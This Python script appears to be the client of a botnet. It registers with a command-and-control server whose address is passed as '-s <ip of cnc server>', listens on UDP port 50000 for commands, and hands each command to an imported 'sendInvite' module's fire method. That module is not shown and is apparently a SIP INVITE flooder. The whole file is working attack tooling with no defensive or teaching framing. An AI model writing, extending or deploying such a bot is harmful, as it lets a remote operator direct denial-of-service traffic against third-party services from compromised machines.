import sys
import getopt
import socket
import registerClient
import sendInvite


try:
    opts, args = getopt.getopt(sys.argv[1:], "h:s:i:")
except getopt.GetoptError as e:
    print("Usage: client.py -s <serveraddress> without brackets\n")
    print("Use client.py -h for help")
    sys.exit(2)
if opts.__len__() < 2:
    print("Usage: client.py -s <ip of cnc server> -i <local ip address> without brackets")
    print("Use client.py -h for help")
    sys.exit(2)
for o, a in opts:
    if o == '-s':
        serveraddress = a
    if o == '-i':
        local_ip = a
    elif o == '-h':
        print("Usage: client.py -s <ip of cnc server> -i <local ip address> without brackets")
        sys.exit(0)

r = registerClient.RegisterClient(serveraddress, 40000, local_ip)
r.register()
s = sendInvite.SendInvite
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(("0.0.0.0", 50000))
buffersize = 1024
while 1:
    data = sock.recvfrom(buffersize)
    if data:
        decoded = data[0].decode("utf-8")
        s.fire(decoded)
